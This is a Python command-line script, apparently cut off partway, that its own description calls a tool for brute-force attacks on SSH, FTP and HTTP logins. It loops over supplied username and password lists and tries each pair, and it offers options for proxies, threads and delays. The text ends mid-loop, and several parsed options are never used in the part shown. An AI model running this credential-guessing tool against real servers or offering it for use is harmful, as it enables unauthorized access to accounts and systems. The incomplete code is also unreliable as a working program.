import argparse
import socket
import paramiko
import ftplib
import requests
import random
import time

def ssh_connect(target, username, password):
    try:
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh.connect(target, port=22, username=username, password=password, timeout=5)
        ssh.close()
        return True
    except:
        return False

def ftp_connect(target, username, password):
    try:
        ftp = ftplib.FTP(target, timeout=5)
        ftp.login(username, password)
        ftp.quit()
        return True
    except:
        return False

def http_connect(target, username, password):
    try:
        session = requests.Session()
        response = session.get(target, auth=(username, password), timeout=5)
        if response.status_code == 200:
            return True
        else:
            return False
    except:
        return False

def handle_proxy(proxy):
    proxies = {
        'http': 'http://' + proxy,
        'https': 'https://' + proxy
    }
    return proxies

def main():
    parser = argparse.ArgumentParser(description='Conduct brute-force attacks against common protocols, such as SSH, FTP, and HTTP')
    parser.add_argument('--target', '-t', required=True, help='Target IP or domain name')
    parser.add_argument('--userlist', '-u', required=True, help='Path to file containing a list of usernames to try')
    parser.add_argument('--passlist', '-p', required=True, help='Path to file containing a list of passwords to try')
    parser.add_argument('--protocol', '-P', required=True, choices=['ssh', 'ftp', 'http'], help='Protocol to use (SSH, FTP, HTTP)')
    parser.add_argument('--port', '-po', default=None, type=int, help='Port number to use for the protocol')
    parser.add_argument('--proxy', '-pr', default=None, help='Enable the use of a proxy server')
    parser.add_argument('--threads', '-th', default=5, type=int, help='Number of threads to use for concurrent connections')
    parser.add_argument('--delay', '-d', default=1, type=float, help='Delay in seconds between each attempt')
    parser.add_argument('--timeout', '-to', default=5, type=int, help='Timeout in seconds for each connection attempt')
    args = parser.parse_args()

    target = args.target
    userlist = args.userlist
    passlist = args.passlist
    protocol = args.protocol.lower()
    port = args.port
    proxy = args.proxy
    num_threads = args.threads
    delay = args.delay
    timeout = args.timeout

    if port is None:
        if protocol == 'ssh':
            port = 22
        elif protocol == 'ftp':
            port = 21
        elif protocol == 'http':
            port = 80

    usernames = [line.rstrip() for line in open(userlist)]
    passwords = [line.rstrip() for line in open(passlist)]

    if proxy:
        proxies = handle_proxy(proxy)
    else:
        proxies = None

    successful = False
    for i in range(len(usernames)):
        for j in range(len(passwords)):
            username = usernames[i]
            password = passwords[j]
            if protocol == 'ssh':
                success = ssh_connect(target, username, password)
            elif protocol == 'ftp':
                success = ftp_connect(target, username, password)
            elif protocol == 'http':

